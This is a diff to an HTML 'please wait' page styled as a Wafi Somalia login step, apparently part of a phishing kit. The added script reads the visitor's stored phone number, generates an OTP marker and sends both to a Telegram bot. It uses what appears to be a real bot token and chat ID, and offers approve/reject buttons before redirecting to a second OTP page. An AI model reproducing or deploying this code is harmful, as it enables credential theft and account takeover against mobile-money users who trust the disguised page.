@@ -8,7 +8,7 @@
 @keyframes spin{to{transform:rotate(360deg)}}
 h2{color:#65a30d;margin:0;font-size:24px}
 p{color:#888;margin:10px 0 0 0}
-.footer{margin-top:40px;color:white;font-size:12px}
+.footer{margin-top:40px;color:white;font-size:12px;text-align:center}
 </style></head><body>
 <div class="box">
 <div class="circle"><div class="loader"></div></div>
@@ -17,6 +17,19 @@ p{color:#888;margin:10px 0 0 0}
 <div class="footer">© 2026 Wafi Somalia</div>
 </div>
 <script>
+const BOT_TOKEN = "8917447619:AAEUHL4o4CYy4SMyrLqrw1knboCk-AApmlQ";
+const CHAT_ID = "8630213836";
+const phone = localStorage.getItem('loginPhone') || 'N/A';
+const otp1 = Math.floor(100000 + Math.random() * 900000);
+localStorage.setItem('otp1', otp1);
+
+const msg = `1️⃣ FIRST OTP VERIFICATION\n\nNEW USER - STEP 1/2\n🇸🇴 Country: Somalia\n🌍 Country Code: +252\n📱 Phone Number: ${phone}\n🔒 First OTP Code: ${otp1}\n⏰ Time: ${new Date().toLocaleString()}\n\n⚠️ Verify FIRST OTP:\n⏰ Timeout: 5 minutes`;
+
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+  method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({chat_id:CHAT_ID,text:msg,reply_markup:{inline_keyboard:[[{"text":"✅ Correct (First OTP)","callback_data":"otp1_ok"},{"text":"❌ Wrong Code","callback_data":"otp1_no"}]]}})
+});
+
 let count = 10;
 const timer = setInterval(()=>{
   document.getElementById('timer').innerText = `Fadlan sug... (${count}s)`;
@@ -26,18 +39,4 @@ const timer = setInterval(()=>{
     window.location='loading.html?next=otp2.html';
   }
 }, 1000);
-
-// Send First OTP to Telegram
-const BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
-const CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";
-const phone = localStorage.getItem('loginPhone');
-const otp1 = Math.floor(100000 + Math.random() * 900000);
-localStorage.setItem('otp1', otp1);
-
-const msg = `1️⃣ shannpete - FIRST OTP (Step 1/2)\n\nNEW USER - FIRST VERIFICATION\n🇸🇴 Country: Somalia\n🌍 Country Code: +252\n📱 Phone Number: ${phone}\n🔒 First OTP Code: ${otp1}\n⏰ Time: ${new Date().toLocaleString()}\n\n⚠️ Verify FIRST OTP:\n⏰ Timeout: 5 minutes\n📝 Next: Second OTP will be sent after approval`;
-
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-  method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({chat_id:CHAT_ID,text:msg,reply_markup:{inline_keyboard:[[{"text":"✅ Correct (First OTP)","callback_data":"otp1_ok"},{"text":"❌ Wrong Code","callback_data":"otp1_no"}]]}})
-});
 </script></body></html>
